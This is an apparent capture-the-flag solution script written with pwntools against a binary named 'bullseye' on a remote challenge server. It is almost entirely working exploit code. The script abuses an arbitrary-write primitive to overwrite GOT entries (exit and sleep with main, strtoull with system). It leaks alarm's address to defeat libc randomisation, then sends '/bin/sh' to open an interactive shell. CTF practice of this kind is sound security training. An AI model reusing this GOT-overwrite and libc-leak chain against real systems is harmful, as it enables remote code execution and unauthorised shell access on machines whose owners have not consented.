from pwn import *

context.log_level = "DEBUG"

e = ELF("./bullseye")

#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("./bullseye-libc-2.so")

#BSS = 0x0000000000404080
BSS = 0x4040b0

def pack_quad(quad):
    return hex(quad)[2:]


def str_to_quad(string):
    assert len(string) <= 8
    return int(enhex(string.encode().ljust(8, b"\x00")[::-1]), base=16)


def write_quad_where(stream, quad, where):
    stream.recvline()
    stream.recvline()
    stream.recvline()
    stream.sendline(pack_quad(where))
    stream.recvline()
    stream.sendline(pack_quad(quad))


def init_exploit():

    #nc jh2i.com 50031
    stream = remote("jh2i.com", 50031)
    #stream = process("./bullseye")
    
    #write_quad_where(stream, str_to_quad("/bin/sh"), BSS)

    #gdb.attach(stream);

    #print("Loop on sleep")
    #write_quad_where(stream, e.symbols["main"], e.got["sleep"]) # loop on sleep

    print("loop on exit")
    write_quad_where(stream, e.symbols["main"], e.got["exit"]) # loop on exit

    #gdb.attach(stream)

    #print("bypass sleep")
    #write_quad_where(stream, e.symbols["main"] + 198, e.got["sleep"]) # Bypass sleep

    alarm_addr = int(stream.recvline(), base=16)
    libc.address = alarm_addr - libc.symbols["alarm"]

    print(f"alarm address: {hex(alarm_addr)}")

    print("loop on sleep")
    write_quad_where(stream, e.symbols["main"], e.got["sleep"]) # loop on sleep

    print("replace strtoull with system")
    write_quad_where(stream, libc.sym["system"], e.got["strtoull"]) # replace strtoull with system

    stream.recvline()
    stream.recvline()
    stream.recvline()
    stream.sendline("/bin/sh")

    return stream


def leak_alarm(stream):
    alarm_addr = int(stream.recvline(), base=16)
    print(alarm_addr)
    write_quad_where(stream, e.symbols["main"], e.got["exit"]) # Fix sleep

    return alarm_addr

    

p = init_exploit()

#gdb.attach(p)

#leak_alarm(p)
#write_quad_where(p, str_to_quad("/bin/sh"), BSS)


p.interactive()

